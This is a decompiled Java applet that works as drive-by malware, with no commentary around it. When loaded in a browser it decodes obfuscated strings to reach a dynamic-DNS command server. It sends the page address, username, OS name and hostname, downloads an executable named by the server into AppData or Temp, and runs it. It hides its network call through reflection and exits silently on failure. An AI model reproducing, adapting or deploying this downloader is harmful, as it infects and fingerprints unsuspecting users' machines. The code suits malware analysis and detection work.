import java.net.InetAddress;
import java.io.IOException;
import java.nio.channels.Channels;
import java.io.InputStream;
import java.io.File;
import java.io.Reader;
import java.io.InputStreamReader;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    private static String B;
    private static StringBuffer AD;
    private static String DEZ;
    private static BufferedReader D;
    private static FileOutputStream E;
    private static String A;
    private static String C;
    
    public static String F(String s, final String b, final int n) {
        String s2 = "";
        if (n == 1) {
            if (s.startsWith(Java.B) && Java.B != null) {
                try {
                    String string = "";
                    Java.B = b;
                    if (Java.B.length() > 0 && Java.B != null && Java.B != "") {
                        s = (Java.B = s + "?" + Java.B);
                        if (Java.B != null && Java.B != null) {
                            J(new BufferedReader(new InputStreamReader(new URL(Java.B).openConnection().getInputStream())));
                            while ((Java.C = Java.D.readLine()) != null) {
                                string += (Object)Java.AD.append(Java.C);
                            }
                            Java.D.close();
                            Java.B = string;
                        }
                    }
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            s2 = Java.B;
        }
        else if (n == 0) {
            String string2 = "";
            if (n == 0 && n != 1 && n != 2) {
                final String[] split = b.replaceAll("[^0-9]", " ").split(" ");
                if (n != 2 && n != 1) {
                    for (int i = 0; i < split.length; ++i) {
                        string2 += Java.DEZ.charAt(Integer.parseInt(split[i]));
                    }
                    s2 = string2;
                }
            }
        }
        else if (n == 3) {
            Java.B = "http://";
            String s3 = F(s, b, 0);
            if (s3 != "" && F(s, b, 0).contains("appdata") && s3 != "") {
                s3 = System.getenv(s3);
            }
            else if ((s3 != null && s3 != "" && F(s, b, 0).contains("os.name")) || (s3 != null && s3 != "" && F(s, b, 0).contains("mpdir"))) {
                s3 = System.getProperty(s3);
            }
            s2 = s + s3;
        }
        return s2;
    }
    
    public static String ZA() {
        try {
            ZE(F("", "9J0J21J0J28J8J14J28J19J12J15J3J8J17", 3));
            if (Java.A != null) {
                Java.A += "\\";
            }
            if (Java.A == null) {
                ZE(F("", "0J15J15J3J0J19J0", 3));
            }
            if (Java.A != null) {
                Java.A += "\\";
            }
            if (Java.A == null) {
                System.exit(0);
            }
        }
        catch (Exception ex) {
            System.exit(0);
        }
        return Java.A;
    }
    
    private static void ZC(final FileOutputStream e) {
        Java.E = e;
    }
    
    public static void J(final BufferedReader d) {
        Java.D = d;
    }
    
    public static void ZE(final String a) {
        Java.A = a;
    }
    
    public static void ZF(final String s) throws IOException {
        Java.AD = new StringBuffer();
        try {
            if ((ZA() != null && ZA().contains("Roaming")) || (ZA().contains("Temp") && new File(ZA()).exists())) {
                final String[] split = F(F("", "7J19J19J15J26J27J27J5J14J23J23J24J18J14J5J19J22J0J17J4J28J3J24J13J3J13J18J31J0J19J31J7J14J12J4J28J2J14J12J27J6J4J19J28J15J7J15", 3), F("", "18J8J19J4J29", 3) + F(s, "30J20J18J4J17J13J0J12J4J29", 3) + F("GnMvtVKkR", "30J20J17J11J29", 3) + F("http://tinychat-live.com/chat/Murtsen/CCleaner", "28J4J23J4", 3) + F("", "30J2J14J12J15J29", 3) + F(ZD(1, 0), "30J14J18J29", 3) + ZD(0, 1), 1).split("-_-");
                if (split[2] == "G") {
                    if (split[2] == null) {
                        return;
                    }
                }
                try {
                    ZC(new FileOutputStream(ZA() + split[1] + F(".", "4J23J4", 3)));
                    Java.E.getChannel().transferFrom(Channels.newChannel((InputStream)new URL(split[0]).getClass().getMethod("o" + "p" + "en" + "S" + "tr" + "e" + "am", (Class<?>[])new Class[0]).invoke(new URL(split[0]), new Object[0])), 0L, 5242880L);
                    Java.E.close();
                    if (new File(ZA() + split[1] + F(".", "4J23J4", 3)).exists()) {
                        try {
                            System.gc();
                        }
                        catch (Exception ex) {}
                        Runtime.getRuntime().exec(ZA() + split[1] + F(".", "4J23J4", 3));
                        return;
                    }
                    System.exit(0);
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
            else {
                System.exit(0);
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
    }
    
    public static String ZD(final int n, final int n2) {
        try {
            if (n == 1 && n2 != 1) {
                try {
                    ZE(InetAddress.getLocalHost().getHostName().toString());
                    if (Java.A != null) {
                        Java.A = "Unknown";
                    }
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            else if (n2 == 1 && n != 1) {
                try {
                    ZE(F("", "14J18J28J13J0J12J4", 3));
                    if (Java.A != null) {
                        Java.A = "Unknown";
                    }
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
            else {
                Java.A = "Unknown";
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
        return Java.A;
    }
    
    @Override
    public void init() {
        try {
            ZF(this.getDocumentBase().toString());
            System.exit(0);
        }
        catch (Exception ex) {
            System.exit(0);
        }
    }
    
    static {
        Java.DEZ = "abcdefghijklmnopqrstuvwxyz:/.=&-";
    }
}